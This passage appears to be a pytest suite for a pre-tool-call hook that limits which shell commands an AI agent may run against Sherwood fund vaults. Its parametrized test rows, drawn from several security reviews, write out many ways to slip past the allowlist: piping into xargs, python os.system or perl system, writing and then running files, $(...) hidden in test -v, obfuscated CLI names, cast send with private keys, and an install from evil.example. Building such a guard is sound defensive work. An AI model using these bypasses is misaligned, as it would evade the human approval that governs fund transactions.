    "cat ~/.hermes/plugins/sherwood-monitor/funds/*/generic-call/*.json | grep -c propose",
    "ls ~/.hermes/plugins/*/funds",
    "sherwood governor info --vault $VAULT_ADDRESS",  # the vault-owner skill's read with a variable
    'sherwood vault info --vault "$VAULT_ADDRESS"',
    "which sherwood",
    "hermes sherwood status",
    f"sherwood proposal list --vault {VAULT} --json | jq '.[] | select(.state==\"Pending\")'",
    f"cast call {VAULT} 'totalAssets()(uint256)'",
])
def test_delta2_reads_still_pass(command):
    out, _, _ = run(command)
    assert out is None, out


@pytest.mark.parametrize("command, expected", [
    # The variable exception is only for those two reads: never strategy/proposal, never $(...).
    ("sherwood proposal list --vault $VAULT_ADDRESS", "shell_expansion"),
    ("sherwood governor set-cooldown --vault $VAULT_ADDRESS --seconds 3600", "shell_expansion"),
    ("sherwood vault info --vault $(sherwood strategy propose portfolio)", "shell_expansion"),
    ("sherwood vault info --vault $VAULT_ADDRESS; sherwood strategy propose portfolio --vault $V", "shell_expansion"),
    # R7: harmless launcher forms are allowed now; time -p is still refused.
    ("time -p " + OK_P, "unsafe_launcher"),
])
def test_delta2_refusals_that_stay(command, expected):
    out, _, _ = run(command)
    assert out is not None and f"({expected})" in out["message"], out


@pytest.mark.parametrize("command", ["env -u X " + OK_P, "timeout -s KILL 60 " + OK_P, "nice -n 10 " + OK_P])
def test_delta2_harmless_launchers_pass(command):
    out, verdict, _ = run(command)
    assert out is None and verdict is FUND_RULES_APPLIED, out


def test_delta2_no_fund_host_skips_a_huge_command_without_parsing():
    """R8: with no fund the advisory hook does not lex an oversized command."""
    import time as _time

    svc = FundService(LocalJsonBackend(tempfile.mkdtemp()), clock=Clock())
    bare = FundRuntime(svc, FundSettings(agent_name="alpha"), None)
    fetched = []

    async def fetch(sub):
        fetched.append(sub)

    hook = make_pre_tool_call_hook(state_fetcher=fetch, fund_guard=make_fund_guard(bare))
    command = OVER_P + " '--description=" + "x" * (1024 * 1024) + "'"
    t0 = _time.monotonic()
    assert asyncio.run(hook(tool_name="terminal", args={"command": command})) is None
    assert _time.monotonic() - t0 < 1.0 and fetched == []


# == R5: the host corrects a mistyped on-chain id while the vote is open ===========================
def test_the_host_corrects_a_wrong_onchain_id_explicitly():
    from sherwood_monitor.fund.rules import RuleViolation

    svc = make_rt().service
    svc.claim_topic("alpha-fund", "alpha", "t")
    svc.draft_proposal("alpha-fund", "alpha", topic="t", thesis="t", legs=[Leg(summary="TSLA", symbol="TSLA", weight_bps=10000)],
                       max_capital=40_000_000, max_drawdown_bps=1000, strategy_duration=21600)
    svc.set_proposal_status("alpha-fund", "alpha", "p-1", "proposed", onchain_id=10)  # mistyped: the real id is 9
    with pytest.raises(RuleViolation) as exc:
        svc.set_proposal_status("alpha-fund", "alpha", "p-1", "voting", onchain_id=9)
    assert exc.value.code == "onchain_id_conflict" and "correct_onchain_id=true" in exc.value.reason
    rec = svc.set_proposal_status("alpha-fund", "alpha", "p-1", "voting", onchain_id=9, correct_onchain_id=True)
    assert (rec.status, rec.onchain_id) == ("voting", 9)
    card = {"data": {"proposals": {"open": [{"id": "9", "state": "Pending", "againstBps": 700}]}}}
    assert svc.apply_chain_card("alpha-fund", card) == 1 and svc.load("alpha-fund").proposal("9").against_bps == 700
    # Never onto an id another record holds, and not once the vote is over.
    svc.backend.update("alpha-fund", lambda st: st.proposals.append(
        ProposalRecord(id="p-9", proposer_agent="alpha", thesis="t", status="vetoed", onchain_id=11)))
    with pytest.raises(RuleViolation) as exc:
        svc.set_proposal_status("alpha-fund", "alpha", "p-1", "voting", onchain_id=11, correct_onchain_id=True)
    assert exc.value.code == "duplicate_onchain_id"
    svc.set_proposal_status("alpha-fund", "alpha", "p-1", "review")
    with pytest.raises(RuleViolation) as exc:
        svc.set_proposal_status("alpha-fund", "alpha", "p-1", "review", onchain_id=12, correct_onchain_id=True)
    assert exc.value.code == "onchain_id_conflict" and "while the vote is open" in exc.value.reason


async def test_object_points_at_the_corrected_proposal(tmp_path, monkeypatch):
    """R5: with a mistyped id the ❌ Object link named the wrong proposal for the whole vote. The host's
    explicit correction moves it to the right one."""
    from tests.test_smoke_084 import SMOKE_DRAFT, boot_group

    it, ctx, rt_, _bridge, bot = boot_group(tmp_path, monkeypatch)
    assert ctx.call_tool("fund_claim_topic", {"topic": "TSLA NVDA pitch"})["ok"]
    assert ctx.call_tool("fund_draft_proposal", dict(SMOKE_DRAFT))["ok"]
    await it.tap(rt_, bot, "shfund:shipit:p-1", it.HOST_TG)
    ctx.call_tool("fund_set_proposal_status", {"proposal_id": "p-1", "status": "proposed", "onchain_id": 10})
    await it.settle_tasks(40)
    out = ctx.call_tool("fund_set_proposal_status", {"proposal_id": "p-1", "status": "voting", "onchain_id": 9,
                                                     "correct_onchain_id": True})
    assert out["ok"] and out["proposal"]["onchain_id"] == 9
    await it.settle_tasks(40)
    n_before = bot.send_message.await_count
    await it.tap(rt_, bot, "shfund:vote:9", it.ALICE)
    vote_url = it.buttons(bot.send_message.await_args_list[n_before])[0]["url"]
    assert f"/tg/vote?proposal={it.GOVERNOR.lower()}:9&tg={it.ALICE}" in vote_url


# == Third delta review of 6c739c3: the read-only tool list ===============================================
SPLIT_VAULT = VAULT[:16] + "\\\n" + VAULT[16:]
HIDDEN_CLI_OVER = f"$'\\x73herwood' strategy propose portfolio --vault {{v}} {TAIL} --amount 4000 --max-drawdown-bps 9000"
PROPOSE_SIG = ("'propose(address,address,string,uint256,(uint256,uint16),(address,bytes,uint256)[],uint256[],"
               "(address,bytes,uint256)[],uint256[])'")

DELTA3_ROWS = [
    # B1: a read-only tool's output piped or written into something that runs it.
    ("B1 echo | xargs env", f"echo '{OVER_P}' | xargs env", "unlisted_command"),
    ("B1 echo | xargs nice", f"echo '{OVER_P}' | xargs nice", "unlisted_command"),
    ("B1 echo | python3 os.system", f"echo '{OVER_P}' | python3 -c 'import os,sys; os.system(sys.stdin.read())'", "unlisted_command"),
    ("B1 printf | perl system", f"printf '%s' '{OVER_P}' | perl -e 'system(<STDIN>)'", "unlisted_command"),
    ("B1 echo > file then grep | xargs env", f"echo '{OVER_P}' > notes.txt; grep -h sherwood notes.txt | xargs env", "unlisted_command"),
    ("B1 grep sherwood | xargs env", "grep -h sherwood notes.txt | xargs env", "unlisted_command"),
    ("B1 echo | cat | xargs env (through a read-only tool)", f"echo '{OVER_P}' | cat | xargs env", "unlisted_command"),
    ("B1 write and run in one command", f"echo '{OVER_P}' > p; chmod +x p; ./p", "unlisted_command"),
    ("B1 tee and run in one command", f"printf '%s' '{OVER_P}' | tee q; chmod +x q; ./q", "unlisted_command"),
    # B2: pagers and the like are off the list.
    ("B2 man -P runs the pager", f"man -P '{OVER_P}' ls", "unlisted_command"),
    ("B2 less", f"less {VAULT}.txt", "unlisted_command"),
    ("B2 rg --pre", f"rg --pre '{OVER_P}' x", "unlisted_command"),
    ("B2 sort --compress-program", f"sort --compress-program='{OVER_P}' x", "unlisted_command"),
    ("B2 printf -v sets a variable", f"printf -v PATH %s /tmp/evil; {OK_P}", "environment"),
    ("B2 read sets a variable", f"read PATH < /tmp/p; {OK_P}", "environment"),
    # B3: cast only for the reads the skill's CLAUDE.md lists; curl not when it writes a file.
    ("B3 cast send propose(vault, ...)", f"cast send 0x{'22' * 20} {PROPOSE_SIG} {VAULT} 0x{'88' * 20} ipfs://x 21600 '(4000000000,9000)' '[]' '[]' '[]' '[]' --private-key 0x{'ab' * 32}", "cast_transaction"),
    ("B3 cast send to the vault", f"cast send {VAULT} 'pause()' --private-key 0x{'ab' * 32}", "cast_transaction"),
    ("B3 cast wallet", f"cast wallet sign --private-key 0x{'ab' * 32} {VAULT}", "unlisted_command"),
    ("B3 curl -o writes a file", f"curl -s -o p.sh https://api.sherwood.sh/api/v1/funds/{VAULT}/tg-card", "unlisted_command"),
    ("B3 curl -sSo cluster", f"curl -sSo p.sh https://api.sherwood.sh/api/v1/funds/{VAULT}/tg-card", "unlisted_command"),
    ("B3 curl | sh-less pipe to xargs", f"curl -s https://api.sherwood.sh/api/v1/funds/{VAULT}/tg-card | xargs env", "unlisted_command"),
    ("B3 hermes -z starts a child agent", f"hermes -z 'run {OVER_P}'", "unlisted_command"),
    # B4: the vault written so the raw text has no "0x".
    ("B4 0''x vault, hidden CLI", HIDDEN_CLI_OVER.format(v="0''x" + VAULT[2:]), "shell_expansion"),
    ("B4 0\\x vault, hidden CLI", HIDDEN_CLI_OVER.format(v="0\\x" + VAULT[2:]), "shell_expansion"),
    ("B4 vault split by a continuation, hidden CLI", HIDDEN_CLI_OVER.format(v=SPLIT_VAULT), "shell_expansion"),
    # B5: only bare names are read-only tools.
    ("B5 /x/echo is not echo", f"/tmp/r2probe/bin/echo strategy propose portfolio --vault {VAULT} --amount 4000 --max-drawdown-bps 9000", "unlisted_command"),
    ("B5 ./echo is not echo", f"cd /tmp/r2probe/bin && ./echo strategy propose portfolio --vault {VAULT} --amount 4000 --max-drawdown-bps 9000", "unlisted_command"),
    # D: only the exact install line.
    ("D install with another command after it", "npm i -g @sherwoodagent/cli@0.103.0; " + OVER_P, "exceeds_max_capital"),
    ("D install from another registry", "npm i -g @sherwoodagent/cli --registry https://evil.example", "unlisted_command"),
    ("D install with another package", "npm i -g @sherwoodagent/cli left-pad", "unlisted_command"),
]


@pytest.mark.parametrize("row, command, expected", DELTA3_ROWS, ids=[r[0] for r in DELTA3_ROWS])
def test_delta3_review_row(row, command, expected):
    out, _verdict, _ = run(command)
    assert out is not None and f"({expected})" in out["message"], (row, out)


@pytest.mark.parametrize("command", [
    # D: the install / upgrade lines preflight.py and the bundled skill hand out.
    "npm i -g @sherwoodagent/cli",
    "npm i -g @sherwoodagent/cli@latest",
    "npm i -g @sherwoodagent/cli@0.100.5",
    "npm install -g @sherwoodagent/cli@0.103.0",
    # B1's recovery path and the reads that stay allowed.
    f"printf '%s' 'Proposal 9 on {VAULT} is open' | sherwood chat --cohort send --stdin",
    f"sherwood proposal list --vault {VAULT} --json | jq '.[] | select(.state==\"Pending\")'",
    f"cast call {VAULT} 'totalAssets()(uint256)'",
    f"cast calldata 'approve(address,uint256)' {VAULT} 1",
    "cast 4byte 0x095ea7b3",
    f"curl -s https://api.sherwood.sh/api/v1/funds/{VAULT}/tg-card | jq .data.nav",
    f"echo {VAULT} | grep -i 2fd6",
    "hermes sherwood status",
])
def test_delta3_reads_still_pass(command):
    out, _, _ = run(command)
    assert out is None, out


def test_the_approval_prompt_shows_an_onchain_id_correction():
    """NIT: the approving human sees that the call replaces a recorded on-chain id."""
    from sherwood_monitor.fund.authz import approve_directive

    directive = approve_directive("fund_set_proposal_status", "alpha-fund",
                                  {"proposal_id": "p-1", "status": "voting", "onchain_id": 9, "correct_onchain_id": True})
    assert "correct_onchain_id=True" in directive["message"] and "onchain_id=9" in directive["message"]
    plain = approve_directive("fund_set_proposal_status", "alpha-fund", {"proposal_id": "p-1", "status": "voting", "onchain_id": 9})
    assert plain["rule_key"] != directive["rule_key"]


# == Fourth delta review of 0a3e2ba: rule 1, every command on a line naming the CLI or a vault is listed ====
D4 = "/tmp/r2probe"
DELTA4_ROWS = [
    # N1, as reported: write the propose with an allowed tool, then run the file.
    ("N1 >| then run", f"echo '{OVER_P}' >| {D4}/p; chmod +x {D4}/p; {D4}/p", "unlisted_command"),
    ("N1 uniq - OUT then run", f"echo '{OVER_P}' | uniq - {D4}/q; chmod +x {D4}/q; {D4}/q", "unlisted_command"),
    ("N1 curl -T - file:// then run", f"echo '{OVER_P}' | curl -s -T - file://{D4}/u; chmod +x {D4}/u; {D4}/u", "unlisted_command"),
    ("N1 curl -w %output then run", f"curl -s file:///dev/null -w '%output{{{D4}/w}}{OVER_P}'; chmod +x {D4}/w; {D4}/w", "unlisted_command"),
    # The same writes on their own (defence in depth, without the chmod / run that rule 1 refuses).
    ("N1 >| alone", f"echo '{OVER_P}' >| {D4}/p", "unreadable_propose"),
    ("N1 &>> alone", f"echo '{OVER_P}' &>> {D4}/p", "unreadable_propose"),
    ("N1 uniq writes its second operand", f"echo '{OVER_P}' | uniq - {D4}/q", "unlisted_command"),
    ("N1 curl -T upload", f"echo '{OVER_P}' | curl -s -T - https://example.com/u", "unlisted_command"),
    ("N1 curl -w write-out", f"curl -s https://api.sherwood.sh -w '%output{{{D4}/w}}{VAULT}'", "unlisted_command"),
    ("N1 curl file:// read", f"curl -s file:///etc/hosts {VAULT}", "unlisted_command"),
    ("N1 curl --next", f"curl -s https://api.sherwood.sh/{VAULT} --next -o {D4}/x https://x", "unlisted_command"),
    # N2: fund-bind rewrites the fund record; never from an agent terminal call.
    ("N2 hermes sherwood fund-bind", f"hermes sherwood fund-bind alpha-fund --vault 0x{'99' * 20}", "host_command"),
    # Rule 1: a harmless-looking unlisted command, and every compound form around one.
    ("rule 1 sleep after a read", f"sherwood vault info --vault {VAULT} && sleep 5", "unlisted_command"),
    ("rule 1 mkdir before a propose", f"mkdir -p /tmp/x && {OK_P}", "unlisted_command"),
    ("rule 1 subshell", f"{OK_P}; (touch {D4}/p)", "unlisted_command"),
    ("rule 1 group", f"{{ chmod +x {D4}/p; }}; {OK_P}", "unlisted_command"),
    ("rule 1 if/then", f"if true; then chmod +x {D4}/p; fi; {OK_P}", "unlisted_command"),
    ("rule 1 while/do", f"while false; do touch {D4}/p; done; {OK_P}", "unlisted_command"),
    ("rule 1 for loop", f"for f in a; do true; done; {OK_P}", "unlisted_command"),
    ("rule 1 negation", f"! touch {D4}/p; {OK_P}", "unlisted_command"),
    ("rule 1 time", f"time touch {D4}/p; {OK_P}", "unlisted_command"),
    ("rule 1 coproc", f"coproc touch {D4}/p; {OK_P}", "unlisted_command"),
    ("rule 1 background", f"touch {D4}/p & {OK_P}", "unlisted_command"),
    ("rule 1 a closer with a redirect", f"while false; do true; done > {D4}/p; {OK_P}", "unlisted_command"),
    ("rule 1 PATH= on a read-only tool", f"PATH={D4}/bin:/usr/bin cat {VAULT}", "environment"),
    # LOW: any npm spec of the CLI names it; only the exact registry line passes.
    ("npm github spec", "npm i -g github:sherwoodagent/cli", "unlisted_command"),
    ("npm git URL", "npm i -g git+https://github.com/sherwoodagent/cli.git", "unlisted_command"),
    # LOW: cast send has its own message; `file .../sherwood` no longer reads as a launcher problem.
    ("cast send pause with a literal vault", f"cast send {VAULT} 'pause()' --private-key 0x{'ab' * 32}", "cast_transaction"),
    ("file on the CLI path", "file /usr/local/bin/sherwood", "unlisted_command"),
]


@pytest.mark.parametrize("row, command, expected", DELTA4_ROWS, ids=[r[0] for r in DELTA4_ROWS])
def test_delta4_review_row(row, command, expected):
    out, _verdict, _ = run(command)
    assert out is not None and f"({expected})" in out["message"], (row, out)


@pytest.mark.parametrize("command", [
    f"cd /tmp && sherwood vault info --vault {VAULT}",
    f"sherwood vault info --vault {VAULT} && echo done",
    "npm i -g @sherwoodagent/cli",
    "npm i -g @sherwoodagent/cli@latest",
    "npm i -g @sherwoodagent/cli@0.103.0 && sherwood --version",
    f"printf '%s' 'Proposal 9 on {VAULT} is open' | sherwood chat --cohort send --stdin",
    f"if true; then {OK_P}; fi",
    f"while false; do sherwood vault info --vault {VAULT}; done",
    f"{{ {OK_P}; }}",
    f"curl -s https://api.sherwood.sh/api/v1/funds/{VAULT}/tg-card | jq .data.nav",
    "hermes sherwood status",
])
def test_delta4_lines_that_still_pass(command):
    out, _, _ = run(command)
    assert out is None, out


# == Fifth delta review of ff80b8f: test -v evaluates an array subscript ======================================
@pytest.mark.parametrize("command", [
    f"test -v 'x[$({OVER_P})]'",  # M1: bash 4.3+ runs the single-quoted $(...) in the subscript
    f"if test -v 'x[$({OVER_P})]'; then true; fi",
    f"test -v 'x[$({OVER_P})]' && sherwood --version",
    f"test -R 'x[`{OVER_P}`]'",
    f"test -n {VAULT}",
])
def test_m1_test_is_not_a_read_only_tool(command):
    out, _verdict, _ = run(command)
    assert out is not None and "(unlisted_command)" in out["message"], out


@pytest.mark.parametrize("command", [
    f"sherwood proposal list --vault {VAULT} --json | jq '.[] | select(.state==\"Pending\")'",
    f"sherwood proposal list --vault {VAULT} | grep Pending",
    f"sherwood proposal show 9 --vault {VAULT} 2>&1 | head -40",
    f"cd /tmp && sherwood vault info --vault {VAULT}",
    f"sherwood vault info --vault {VAULT} && echo done",
    "npm i -g @sherwoodagent/cli@0.103.0",
    f"cast call {VAULT} 'totalAssets()(uint256)'",
    "cast 4byte 0x095ea7b3",
    f"printf '%s' 'Proposal 9 on {VAULT}' | sherwood chat --cohort send --stdin",
])
def test_m1_flows_still_pass(command):
    out, _, _ = run(command)
    assert out is None, out
